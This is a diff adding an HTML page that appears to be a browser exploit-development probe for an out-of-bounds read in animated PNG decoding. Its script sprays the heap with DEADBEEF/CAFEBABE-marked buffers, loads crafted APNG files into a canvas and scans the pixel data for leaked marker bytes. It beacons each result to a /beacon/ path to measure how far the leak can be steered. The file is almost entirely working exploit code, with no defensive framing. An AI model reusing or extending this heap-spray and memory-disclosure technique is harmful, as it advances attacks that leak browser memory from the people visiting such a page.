@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>V963B</title></head>
+<body><pre id="out">V963B — APNG 321753 OOB controllability spray (B)</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+var RUN='r'+Date.now().toString(36)+Math.random().toString(36).slice(2,6);
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,body){try{new Image().src='/beacon/V963B-'+tag+'?d='+encodeURIComponent(String(body==null?'':body).slice(0,700))+'&run='+encodeURIComponent(RUN)+'&t='+Date.now()+'&s=1';}catch(e){}}
+window.onerror=function(msg,src,line){ bk('ERR','onerror:'+String(msg)+'@'+line); };
+function hx(n){ var s=(n&255).toString(16); return s.length<2?'0'+s:s; }
+function loadImg(src,n){ return new Promise(function(res,rej){ var im=new Image(); im.onload=function(){res(im)}; im.onerror=function(){rej(new Error('load-fail'))}; im.src=src+'?cb='+Date.now()+'_'+n+'_'+Math.random(); }); }
+var keep=[];
+function spray(){
+  keep=[];
+  // marker bytes: DE AD BE EF CA FE BA BE
+  var M=[0xDE,0xAD,0xBE,0xEF,0xCA,0xFE,0xBA,0xBE];
+  var sizes=[64,128,256,512,1024,2048,4096,8192,16384, 64*4,128*4,256*4,512*4, 96*4,192*4,384*4];
+  var count=0;
+  for(var si=0;si<sizes.length;si++){
+    var sz=sizes[si];
+    for(var k=0;k<40;k++){
+      var ab=new ArrayBuffer(sz);
+      var u=new Uint8Array(ab);
+      for(var j=0;j<u.length;j++) u[j]=M[j%8];
+      keep.push({ab:ab,u:u}); count++;
+    }
+  }
+  // also some typed views / clones kept
+  for(var i=0;i<60;i++){ var ab=new ArrayBuffer(4096); var dv=new DataView(ab); for(var p=0;p<4096;p+=8){dv.setUint32(p,0xDEADBEEF,true); dv.setUint32(p+4,0xCAFEBABE,true);} keep.push({ab:ab,dv:dv}); count++; }
+  bk('SPRAY','objs='+count+' types=AB+DV sizes='+sizes.length);
+}
+function scanWindow(name,src,fullW,fullH,frW,frH,iter){
+  bk('T-PRE',name+'#'+iter);
+  return loadImg(src,iter).then(function(im){
+    var c=document.createElement('canvas'); c.width=fullW; c.height=fullH;
+    var ctx=c.getContext('2d'); ctx.clearRect(0,0,fullW,fullH); ctx.drawImage(im,0,0);
+    var d=ctx.getImageData(0,0,fullW,fullH).data;
+    var rows=[0,1,2,3,Math.max(0,frH-1)];
+    var x0=Math.max(0,frW-4), x1=Math.min(fullW-1,frW+15);
+    var marker=0, marker2=0, nz=0, samp=[];
+    // scan byte sequences in the whole window region
+    for(var ri=0;ri<rows.length;ri++){
+      var y=rows[ri]; if(y>=fullH) continue;
+      var rowBytes=[];
+      for(var x=x0;x<=x1;x++){ var i=(y*fullW+x)*4; rowBytes.push(d[i],d[i+1],d[i+2],d[i+3]); }
+      // find DE AD BE EF CA FE BA BE
+      for(var b=0;b+7<rowBytes.length;b++){
+        if(rowBytes[b]===0xDE&&rowBytes[b+1]===0xAD&&rowBytes[b+2]===0xBE&&rowBytes[b+3]===0xEF&&rowBytes[b+4]===0xCA&&rowBytes[b+5]===0xFE&&rowBytes[b+6]===0xBA&&rowBytes[b+7]===0xBE) marker++;
+      }
+      // also check for DEADBEEF dword
+      for(var b=0;b+3<rowBytes.length;b++){
+        if(rowBytes[b]===0xEF&&rowBytes[b+1]===0xBE&&rowBytes[b+2]===0xAD&&rowBytes[b+3]===0xDE) marker2++; // little-endian in some views
+        if(rowBytes[b]===0xDE&&rowBytes[b+1]===0xAD&&rowBytes[b+2]===0xBE&&rowBytes[b+3]===0xEF) marker2++;
+      }
+      for(var b=0;b<rowBytes.length;b++){ if(rowBytes[b]!==0) nz++; }
+      if(samp.length<3){ var s=''; for(var b=0;b<Math.min(16,rowBytes.length);b++) s+=hx(rowBytes[b]); samp.push('y'+y+'='+s); }
+    }
+    bk('W',name+'#'+iter+'|m8='+marker+'|m4='+marker2+'|nz='+nz+'|'+samp.join(','));
+    say('W '+name+'#'+iter+' m8='+marker+' m4='+marker2+' nz='+nz);
+  }).catch(function(e){ bk('T-ERR',name+'#'+iter+'|'+String(e&&e.message||e).slice(0,140)); });
+}
+(async function(){
+  bk('BOOT','APNG 321753 OOB controllability: baseline(scan V947B window) -> spray(DEADBEEF/CAFEBABE varied AB+DV) -> scan; run='+RUN);
+  // baseline
+  await scanWindow('f64_16','v946b_f64_fr16.apng',64,64,16,16,'base');
+  await scanWindow('f64_32','v946b_f64_fr32.apng',64,64,32,32,'base');
+  await scanWindow('f128_16','v946b_f128_fr16.apng',128,64,16,16,'base');
+  // spray
+  bk('SPRAY-PRE','start');
+  spray();
+  // scan after spray
+  await scanWindow('f64_16','v946b_f64_fr16.apng',64,64,16,16,'spr1');
+  await scanWindow('f64_32','v946b_f64_fr32.apng',64,64,32,32,'spr1');
+  await scanWindow('f128_16','v946b_f128_fr16.apng',128,64,16,16,'spr1');
+  // respray + scan again
+  spray();
+  await scanWindow('f64_16','v946b_f64_fr16.apng',64,64,16,16,'spr2');
+  await scanWindow('f64_32','v946b_f64_fr32.apng',64,64,32,32,'spr2');
+  bk('DONE','complete; m8/m4>0 in spr* vs base => controllability signal');
+  say('done run='+RUN+' keep='+keep.length);
+})();
+</script>
+</body></html>
